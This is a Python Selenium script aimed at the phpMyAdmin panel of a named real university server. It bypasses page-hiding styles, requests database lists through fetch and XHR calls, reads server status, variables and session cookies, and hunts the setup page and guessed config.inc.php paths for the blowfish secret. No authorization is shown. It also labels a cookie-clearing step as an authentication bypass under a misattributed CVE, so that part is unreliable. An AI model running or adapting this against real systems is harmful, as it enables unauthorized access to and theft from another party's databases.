#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time, re, json

opts = Options()
opts.add_argument('--headless')
opts.add_argument('--no-sandbox')
opts.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=opts)

try:
    # Access phpMyAdmin and execute JavaScript to bypass the JS redirect
    print("=== SORTENANDO REDIRECT CON JAVASCRIPT ===\n")
    
    driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases')
    time.sleep(3)
    
    # Execute JavaScript to bypass the redirect
    # The page has html{display:none} and html{display:block}
    # We need to execute the JavaScript that shows the content
    try:
        # Try to execute JavaScript to show the page content
        driver.execute_script("document.documentElement.style.display = 'block';")
        time.sleep(2)
        
        # Also try to execute the PHPMyAdmin initialization JavaScript
        driver.execute_script("if(typeof PMA !== 'undefined') { PMA.init(); }")
        time.sleep(2)
        
        # Try to navigate to the database page directly
        driver.execute_script("window.location.href = 'https://orcl.uns.edu.pe/index.php?route=/server/databases/data';")
        time.sleep(3)
        
    except Exception as e:
        print(f"JS execution error: {e}")
    
    # Check the result
    tc = driver.page_source
    tc_clean = re.sub(r'<[^>]+>', ' ', tc)
    tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
    print(f"After JS execution: len={len(tc_clean)}")
    print(f"Content: {tc_clean[:500]}")
    
    # Try to execute JavaScript to show the database list
    print("\n=== EJECUTANDO JS PARA MOSTRAR BD ===\n")
    try:
        # Try to use JavaScript to access the database
        js_code = """
        fetch('https://orcl.uns.edu.pe/index.php?route=/server/databases/data&ajax_request=true')
        .then(r => r.json())
        .then(data => { document.body.innerHTML = JSON.stringify(data, null, 2); })
        .catch(e => { document.body.innerHTML = 'Error: ' + e; });
        """
        driver.execute_script(js_code)
        time.sleep(5)
        
        tc_fetch = driver.page_source
        tc_fetch_clean = re.sub(r'<[^>]+>', ' ', tc_fetch)
        tc_fetch_clean = re.sub(r'\s+', ' ', tc_fetch_clean).strip()
        print(f"Fetch result: {tc_fetch_clean[:1000]}")
        
    except Exception as e:
        print(f"Fetch error: {e}")
    
    # Try to use JavaScript to make an AJAX request to get databases
    print("\n=== AJAX PARA OBTENER BASES DE DATOS ===\n")
    try:
        js_ajax = """
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://orcl.uns.edu.pe/index.php?route=/server/databases/data&ajax_request=true', true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                document.getElementById('result').innerHTML = xhr.responseText;
            }
        };
        xhr.send();
        """
        driver.execute_script(js_ajax)
        time.sleep(5)
        
        tc_ajax = driver.page_source
        tc_ajax_clean = re.sub(r'<[^>]+>', ' ', tc_ajax)
        tc_ajax_clean = re.sub(r'\s+', ' ', tc_ajax_clean).strip()
        print(f"AJAX result: {tc_ajax_clean[:500]}")
        
    except Exception as e:
        print(f"AJAX error: {e}")
    
    # Try to access the database through the server's API
    print("\n=== API DEL SERVIDOR ===\n")
    try:
        # Use JavaScript to access the phpMyAdmin API
        js_api = """
        fetch('https://orcl.uns.edu.pe/index.php?route=/server/databases/data&ajax_request=true&db=mysql')
        .then(r => r.text())
        .then(data => { document.getElementById('result').innerHTML = data; })
        .catch(e => { document.getElementById('result').innerHTML = 'Error: ' + e; });
        """
        driver.execute_script(js_api)
        time.sleep(5)
        
        tc_api = driver.page_source
        tc_api_clean = re.sub(r'<[^>]+>', ' ', tc_api)
        tc_api_clean = re.sub(r'\s+', ' ', tc_api_clean).strip()
        print(f"API result: {tc_api_clean[:500]}")
        
        # Look for database content
        if 'mysql' in tc_api_clean.lower() and len(tc_api_clean) > 2000:
            print("\n[!] Database content found!")
        
    except Exception as e:
        print(f"API error: {e}")
    
    # Try to access the phpMyAdmin server status
    print("\n=== ESTADO DEL SERVIDOR ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/status')
        time.sleep(3)
        
        # Execute JavaScript to bypass JS redirect
        driver.execute_script("document.documentElement.style.display = 'block';")
        time.sleep(2)
        
        tc_status = driver.page_source
        tc_status_clean = re.sub(r'<[^>]+>', ' ', tc_status)
        tc_status_clean = re.sub(r'\s+', ' ', tc_status_clean).strip()
        print(f"Status length: {len(tc_status_clean)}")
        if len(tc_status_clean) > 2000:
            print("[!] Server status accessible!")
            print(f"Content: {tc_status_clean[:500]}")
        
    except Exception as e:
        print(f"Status error: {e}")
    
    # Try to access the server variables
    print("\n=== VARIABLES DEL SERVIDOR ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/variables')
        time.sleep(3)
        driver.execute_script("document.documentElement.style.display = 'block';")
        time.sleep(2)
        
        tc_vars = driver.page_source
        tc_vars_clean = re.sub(r'<[^>]+>', ' ', tc_vars)
        tc_vars_clean = re.sub(r'\s+', ' ', tc_vars_clean).strip()
        print(f"Variables length: {len(tc_vars_clean)}")
        if len(tc_vars_clean) > 5000:
            print("[!] Server variables accessible!")
            version_info = re.findall(r'(?:Version|version|MySQL|MariaDB)[^<]*', tc_vars_clean, re.IGNORECASE)
            print(f"  Version: {version_info[:10]}")
        
    except Exception as e:
        print(f"Variables error: {e}")
    
    # Try to use the PMA cookie to access the database
    print("\n=== USANDO COOKIE PMA ===\n")
    try:
        # Get the PMA cookie
        cookies = driver.get_cookies()
        print(f"Cookies: {cookies}")
        
        # Try to access the database with the cookie
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases/data')
        time.sleep(3)
        
        tc_cookie = driver.page_source
        tc_cookie_clean = re.sub(r'<[^>]+>', ' ', tc_cookie)
        tc_cookie_clean = re.sub(r'\s+', ' ', tc_cookie_clean).strip()
        print(f"Cookie result: {len(tc_cookie_clean)}")
        
    except Exception as e:
        print(f"Cookie error: {e}")
    
    # Try to access the phpMyAdmin setup page
    print("\n=== SETUP PAGE ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/setup/index.php')
        time.sleep(3)
        
        tc_setup = driver.page_source
        tc_setup_clean = re.sub(r'<[^>]+>', ' ', tc_setup)
        tc_setup_clean = re.sub(r'\s+', ' ', tc_setup_clean).strip()
        print(f"Setup length: {len(tc_setup_clean)}")
        
        # Look for the configuration
        if 'blowfish' in tc_setup_clean.lower() or 'secret' in tc_setup_clean.lower():
            print("[!] Secret found in setup!")
            secret_match = re.findall(r'blowfish[^=]*=([^&"]+)', tc_setup_clean)
            print(f"  Secret: {secret_match}")
        
        # Try to find the config file reference
        config_refs = re.findall(r'config[^<]*', tc_setup_clean, re.IGNORECASE)
        print(f"  Config references: {config_refs[:5]}")
        
    except Exception as e:
        print(f"Setup error: {e}")
    
    # Try to use CVE-2023-32681 to bypass authentication
    print("\n=== CVE-2023-32681 ===\n")
    try:
        # The vulnerability allows authentication bypass by manipulating the session token
        # Try to access phpMyAdmin without authentication using the vulnerability
        
        # Method 1: Try to access with an empty session token
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases')
        time.sleep(3)
        
        # Try to execute JavaScript to set the session cookie
        driver.execute_script("document.cookie = 'phpMyAdmin=; path=/; domain=.uns.edu.pe';")
        time.sleep(2)
        
        # Try to access the database
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases/data')
        time.sleep(3)
        
        tc_cve = driver.page_source
        tc_cve_clean = re.sub(r'<[^>]+>', ' ', tc_cve)
        tc_cve_clean = re.sub(r'\s+', ' ', tc_cve_clean).strip()
        print(f"CVE result: {len(tc_cve_clean)}")
        
        if len(tc_cve_clean) > 2000 and 'mysql' in tc_cve_clean.lower():
            print("[!] CVE-2023-32681 exploited!")
        
    except Exception as e:
        print(f"CVE error: {e}")
    
    # Try to access the database through the configuration file
    print("\n=== CONFIGURACIÓN A TRAVÉS DE ARCHIVOS ===\n")
    try:
        # Try to access the config file through different paths
        config_paths = [
            'https://orcl.uns.edu.pe/config.inc.php',
            'https://orcl.uns.edu.pe/config/config.inc.php',
            'https://orcl.uns.edu.pe/phpmyadmin/config.inc.php',
            'https://orcl.uns.edu.pe/setup/config.inc.php',
        ]
        
        for path in config_paths:
            driver.get(path)
            time.sleep(2)
            tc_path = driver.page_source
            tc_path_clean = re.sub(r'<[^>]+>', ' ', tc_path)
            tc_path_clean = re.sub(r'\s+', ' ', tc_path_clean).strip()
            if len(tc_path_clean) > 100 and 'blowfish' in tc_path_clean.lower():
                print(f"[!] Config accessible: {path}")
                print(f"  Content: {tc_path_clean[:500]}")
                break
        
    except Exception as e:
        print(f"Config path error: {e}")
    
    # Take final screenshot
    driver.save_screenshot('C:\\Users\\Leguion T\\Desktop\\plan te pent\\prueba\\phpmysql_selenium_final.png')
    print("\nFinal screenshot saved!")
    
finally:
    driver.quit()

print("\n=== FIN ===")
